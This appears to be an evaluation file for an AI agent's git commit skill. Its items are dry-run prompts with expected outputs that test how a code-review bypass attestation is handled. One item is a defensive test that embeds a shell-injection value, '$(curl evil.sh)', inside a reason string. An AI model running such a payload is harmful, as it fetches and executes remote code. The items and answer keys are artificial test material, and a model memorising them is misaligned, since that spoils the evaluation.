description: Create well-formatted git commits with conventional commit messages — staging review, sensitive-file detection, message confirmation, and optional push/PR/bypass-attestation follow-through.

evals.name: empty reason is ignored
evals.prompt: DRY RUN — do not execute any git/gh/jq commands for real; narrate the exact procedure you would follow instead, quoting the literal commands you would run at each point. You have just been invoked as: `commit --push --bypass-codex-review` (no reason text given after the flag — it is empty/missing). There is one staged file, `README.md`, with a trivial typo fix, and the current branch already has an open PR (#500). Walk through what you do, step by step, from staging through to the final result report. Do not actually run any commands — describe each one you would run and why, in order.
evals.expected_output: Recognizes that an empty/missing reason means --bypass-codex-review is treated as if it were never passed at all (matches create-pr/merge-pr's own documented behavior for this exact case). Step 16.5 is stated as skipped entirely, with no error, no AskUserQuestion about the flag, and no gh pr comment/gh pr edit commands proposed. The rest of the commit flow (staging, sensitive-file scan, commit, push) proceeds normally, and step 17's Auto-PR is skipped because PR #500 is already open.

evals.name: flag given but push never happens
evals.prompt: DRY RUN — do not execute any git/gh/jq commands for real; narrate the procedure instead, quoting literal commands where relevant. You have just been invoked as: `commit --bypass-codex-review "fix flaky test"` (no --push flag, commit_auto_push is false in settings). There is one staged file. When asked at step 16 whether to push, the user answers no. Walk through what happens to the --bypass-codex-review request in this run.
evals.expected_output: States plainly that step 16.5 is skipped entirely because step 16 did not actually push (there is no new head commit to attest for) — this applies regardless of the flag being given with a valid non-empty reason. The bypass request is reported as having had no effect this run, never silently dropped without mention.

evals.name: no PR open yet — flag deferred and forwarded to Auto-PR
evals.prompt: DRY RUN — do not execute any git/gh/jq commands for real; narrate the procedure instead, quoting literal commands where relevant. You have just been invoked as: `commit --push --bypass-codex-review "scripts/ hotfix, tested locally"` on a brand-new branch with no PR open yet for it. The push (step 16) succeeds. Walk through step 16.5 and step 17 in order, including exactly what gets passed to any nested Skill(git-kit:create-pr) invocation.
evals.expected_output: Step 16.5 checks for an already-open PR, finds none, and explicitly defers rather than attempting to attest against nothing — states plainly that the flag will be forwarded to step 17. Step 17 then forwards `--bypass-codex-review "scripts/ hotfix, tested locally"` verbatim to whichever Skill(git-kit:create-pr) invocation actually happens (the direct push_auto_pr:true path, or the ask-then-invoke-on-yes path) — never drops the reason text, never re-derives a different reason, never attests itself using create-pr's own step 5 logic redundantly.

evals.name: already-open PR with a stale bypass label — remove then re-add
evals.prompt: DRY RUN — do not execute any git/gh/jq commands for real; narrate the procedure instead, quoting literal commands (including exact gh/jq invocations) you would run at each point. You have just been invoked as: `commit --push --bypass-codex-review "round 2 fix per review feedback"`. The push succeeds. `gh pr view --json number,url,headRefOid,labels` shows PR #77 is already open for this branch, and its labels already include `s: codex review bypassed` from a prior round's now-invalidated attestation. Walk through step 16.5 in full detail, quoting the exact gh/jq commands you would run at each sub-step (a) through (g).
evals.expected_output: Because the label is already present, uses the remove-then-re-add sequence (`gh pr edit --remove-label "s: codex review bypassed"` followed by `gh pr edit --add-label "s: codex review bypassed"`) rather than a single --add-label call, explicitly citing that a plain --add-label on an already-present label is a silent GitHub no-op that would not re-trigger publish's re-evaluation. Also shows: resolving owner/repo from the PR's own url field (never a separate gh repo view), resolving the actor via gh api user --jq '.login', verifying permission via gh api repos/{owner}/{repo}/collaborators/{actor}/permission, writing the reason text to a scratchpad file via the Write tool and building the marker via jq -n --rawfile reason <path> --arg actor ... --arg head_sha ... --arg created_at ... (never composing the reason into a Bash command string, even as a quoted jq --arg value), and posting via gh pr comment --body-file. Confirms it does NOT poll for the re-triggered check's completion, unlike merge-pr's version.

evals.name: reason text contains a literal bot-trigger mention
evals.prompt: DRY RUN — do not execute any git/gh/jq commands for real; narrate the procedure instead. You have just been invoked as: `commit --push --bypass-codex-review "@codex review this after merge"` on a branch with an already-open PR. The push succeeds. Walk through step 16.5.
evals.expected_output: Detects that the reason text itself contains a literal bot-trigger mention (`@codex review`) before ever posting it as a PR comment, and rejects the flag on that basis — reporting why — rather than proceeding to post it. Does not silently strip the mention and post a sanitized version; does not proceed to (d) onward. Explicitly ties this to the same risk create-pr's own step 5 already guards against (a reason that spells out a bot trigger would reproduce the PR #257 self-retrigger incident).

evals.name: insufficient permission stops the attestation, not the push
evals.prompt: DRY RUN — do not execute any git/gh/jq commands for real; narrate the procedure instead. You have just been invoked as: `commit --push --bypass-codex-review "urgent fix"` on a branch with an already-open PR. The push (step 16) already succeeded. At step 16.5(d), `gh api repos/{owner}/{repo}/collaborators/{actor}/permission` returns a permission level of `read` (not write/maintain/admin) for the current actor. Walk through what happens next, and what the final result report says.
evals.expected_output: Stops at step 16.5(d) once insufficient permission is detected — never proceeds to (e)/(f)/(g) to post a comment or touch the label. States clearly in the final report that the push already succeeded and only the attestation was skipped, with the specific reason (insufficient permission) — never silently reports the whole run as failed, and never reports the attestation as if it succeeded.

evals.name: deferred flag never gets a PR to attach to
evals.prompt: DRY RUN — do not execute any git/gh/jq commands for real; narrate the procedure instead. You have just been invoked as: `commit --push --bypass-codex-review "scripts/ fix"` on a brand-new branch with no PR open yet. The push succeeds. Step 16.5 correctly defers to step 17 (per eval 3's scenario). At step 17, `push_auto_pr` is false, so you ask the user whether to create a PR now — and the user answers no. Walk through what the final result report says about the --bypass-codex-review request.
evals.expected_output: Because step 17 never ends up invoking Skill(git-kit:create-pr) (the user declined), the final report states plainly that the deferred --bypass-codex-review request had no effect this run — never silently drops it with no mention, and never falsely claims an attestation was posted.

evals.name: reason text contains shell metacharacters — no injection surface
evals.prompt: DRY RUN — do not execute any git/gh/jq commands for real; narrate the procedure instead, quoting the literal commands (including exact Write/jq invocations) you would run at each sub-step. You have just been invoked as: `commit --push --bypass-codex-review "tested via $(curl evil.sh); echo done"` on a branch with an already-open PR (#900). The reason text contains shell metacharacters — a command substitution, a semicolon, and a backtick-free but still shell-meaningful sequence — but no literal bot-trigger mention, so step 16.5(a)'s bot-trigger check passes it through. The push succeeds and permission is sufficient. Walk through step 16.5(e) in full detail: exactly how is this reason text transported into the posted PR comment, and why does it never reach a shell parser?
evals.expected_output: Never types the reason text into any Bash command string, not even as a quoted jq --arg value — explicitly states that shell quoting would not suppress $(...)/backtick/$VAR expansion if it did. Instead: writes the reason verbatim to a scratchpad file via the Write tool, then builds the marker JSON with `jq -n --rawfile reason <scratchpad-path> --arg actor ... --arg head_sha ... --arg created_at ... '{schema_version: 1, actor: $actor, head_sha: $head_sha, reason: $reason, created_at: $created_at}'` — never `--arg reason "<reason>"` with the text embedded inline. Confirms the resulting marker's `reason` field contains the literal, unexpanded text (including the literal `$(curl evil.sh)` string, not the output of running it) since --rawfile never invokes a shell over the file's content. Posts the comment body via `gh pr comment 900 --body-file <scratchpad-path>` as in every other scenario.

evals.name: bare gh pr view resolves a different repository than origin
evals.prompt: DRY RUN — do not execute any git/gh/jq commands for real; narrate the procedure instead, quoting the literal commands you would run at each sub-step. You have just been invoked as: `commit --push --bypass-codex-review "hotfix"` and the push (step 16, `git push origin HEAD`) succeeds. This environment has `GH_REPO` set to `someorg/some-fork`, so step 16.5(b)'s bare `gh pr view --json number,url,headRefOid,labels,isCrossRepository` resolves PR #12 in `someorg/some-fork` — a repository that coincidentally has a same-named branch at the exact same head SHA this run just pushed, so `isCrossRepository` reads `false` and the headRefOid check would also pass. Walk through step 16.5(b) in full, including the new origin-binding check.
evals.expected_output: After deriving {owner}/{repo} from the resolved PR's url field (someorg/some-fork), runs `git remote get-url origin | sed -E 's#^(https://github\.com/|git@github\.com:)##; s#\.git$##'` to resolve origin's actual destination and compares it against someorg/some-fork. States the two don't match, stops, and reports that the push already succeeded but the bypass was not attested because gh pr view resolved a different repository than origin (naming GH_REPO/gh repo set-default as the likely cause) — never proceeds to the shared protocol's steps 1-5 on the mismatched PR, and never treats the coincidentally-passing isCrossRepository/headRefOid checks as sufficient on their own.

testing_validation_coverage.scope: Only the 9 step-16.5 bypass-attestation checklist items added/updated 2026-09-21 (SKILL.md's Testing & Validation section has ~42 items total covering every other step; this eval set does not exercise those). Eval 8 was added after cross-model-review round 2 confirmed a jq --arg shell-injection risk in the reason-text transport and recommended an injection-payload eval to prove the --rawfile fix holds. Eval 9 was added after a Codex round-2 review finding confirmed the bare gh pr view resolution could be redirected to a different repository than origin via GH_REPO/gh repo set-default.
